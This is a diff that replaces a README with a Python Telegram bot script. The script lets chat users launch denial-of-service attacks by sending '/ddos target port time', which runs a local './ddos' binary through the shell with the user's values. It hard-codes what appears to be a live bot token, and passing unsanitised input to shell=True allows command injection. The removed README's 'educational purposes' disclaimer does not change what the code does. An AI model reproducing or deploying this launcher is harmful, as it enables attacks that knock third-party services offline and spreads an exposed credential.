@@ -1,44 +1,47 @@
+#!/usr/bin/python3
+# By Indian Watchdogs @SrcEsp
 
-# DDoS Project Telegram Bot
+import telebot
+import subprocess
 
-This Telegram bot allows you to send DDoS commands, such as `/ddos ip port time` and `/help`. **Use with caution** and for educational purposes only.
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7073204956:AAHtrbmX-dijQy2SC_OV7FmCVJleJcZQXsA')
 
-## Setup Instructions
+# Handler for /ddos command
+@bot.message_handler(commands=['ddos'])
+def handle_ddos(message):
+    command = message.text.split()
+    if len(command) == 4:  # Accept target, port, and time
+        target = command[1]
+        port = int(command[2])  # Convert port to integer
+        time = int(command[3])  # Convert time to integer
+        
+        if time > 181:
+            response = "Error: Time interval must be less than 181."
+        else:
+            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+            full_command = f"./ddos {target} {port} {time} 200"
+            subprocess.run(full_command, shell=True)  # Run the command in the shell
+            response = f"ddos Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
+    else:
+        response = '''Usage: /ddos <target> <port> <time>
+Example: /ddos 192.168.1.1 80 60
+'''
+    bot.reply_to(message, response)
 
-### 1. Clone the Repository
-To clone this repository into your GitHub Codespace or local machine, use the following commands:
+# Function to handle the reply when users run the /ddos command
+def start_attack_reply(message, target, port, time):
+    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: ddos\nBy ABDEKHTU"
+    bot.reply_to(message, response)
 
-```bash
-git clone <repository-url>
-cd <repository-directory>
-```
+# Command handler for /help
+@bot.message_handler(commands=['help'])
+def handle_help(message):
+    response = '''Available commands:
+    
+/ddos <target> <port> <time> - Start ddos attack
+'''
+    bot.reply_to(message, response)
 
-### 2. Set Executable Permissions
-Ensure that all script files are executable by running:
-
-```bash
-chmod +x *
-```
-
-### 3. Install Required Python Libraries
-Install the necessary Python libraries using pip:
-
-```bash
-pip install telebot pymongo
-```
-
-## Usage
-
-### Telegram Bot Commands
-
-- **/ddos**: Initiates a DDoS attack with the specified IP, port, and time.
-  - Example: `/ddos 192.168.0.1 80 120`
-- **/help**: Provides a list of available commands and their descriptions.
-
-## Disclaimer
-
-This project is created for **educational purposes only**. The author is **not responsible** for any misuse or illegal activity using this code. Use it responsibly and only in environments where you have explicit permission.
-
-## License
-
-This project is licensed under the MIT License. See the `LICENSE` file for more details.
+# Start the bot
+bot.polling()
